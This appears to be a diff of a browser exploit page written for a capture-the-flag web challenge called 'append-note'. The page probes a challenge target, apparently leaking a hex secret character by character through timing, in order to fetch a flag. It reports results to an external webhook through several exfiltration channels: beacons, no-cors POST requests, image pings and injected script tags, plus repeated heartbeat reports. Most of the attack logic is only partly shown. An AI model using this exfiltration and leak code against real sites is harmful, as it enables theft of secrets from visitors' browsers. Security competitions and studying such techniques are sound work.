@@ -17,8 +17,8 @@ body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 16p
 <div id="log"></div>
 
 <script>
-const TARGET = "https://append-note-4e86a.instancer.lac.tf";
-const WEBHOOK = "https://crimson-griffin-76.webhook.cool";
+const TARGET = "https://append-note-3npey.instancer.lac.tf";
+const WEBHOOK = "https://careful-comet-22.webhook.cool";
 const CHARS = "0123456789abcdef";
 
 const PROBE_TIMEOUT_MS = 420;
@@ -39,9 +39,15 @@ function log(msg, cls = "") {
 
 function report(msg) {
     const q = encodeURIComponent(msg);
-    try { navigator.sendBeacon(WEBHOOK, msg); } catch (e) {}
-    try { fetch(WEBHOOK + "?m=" + q, { mode: "no-cors" }); } catch (e) {}
-    try { (new Image()).src = WEBHOOK + "?i=" + q; } catch (e) {}
+    const t = Date.now();
+    try { navigator.sendBeacon(WEBHOOK + "/beacon?t=" + t, msg); } catch (e) {}
+    try { fetch(WEBHOOK + "/fetch?t=" + t, { mode: "no-cors", method: "POST", body: msg }); } catch (e) {}
+    try { (new Image()).src = WEBHOOK + "/ping?d=" + q + "&t=" + t; } catch (e) {}
+    try {
+        const s = document.createElement("script");
+        s.src = WEBHOOK + "/ping?d=" + q + "&t=" + t + "&s=1";
+        document.head.appendChild(s);
+    } catch (e) {}
 }
 
 function setStatus(msg) {
@@ -168,7 +174,12 @@ async function fetchFlag(secret) {
 }
 
 async function main() {
-    report("START");
+    report("BOOT");
+    report("BOOT");
+    report("BOOT");
+    report("BOOT");
+    report("BOOT");
+    setInterval(() => report("HB"), 5000);
     log(`Target: ${TARGET}`);
     log(`Webhook: ${WEBHOOK}`);
 
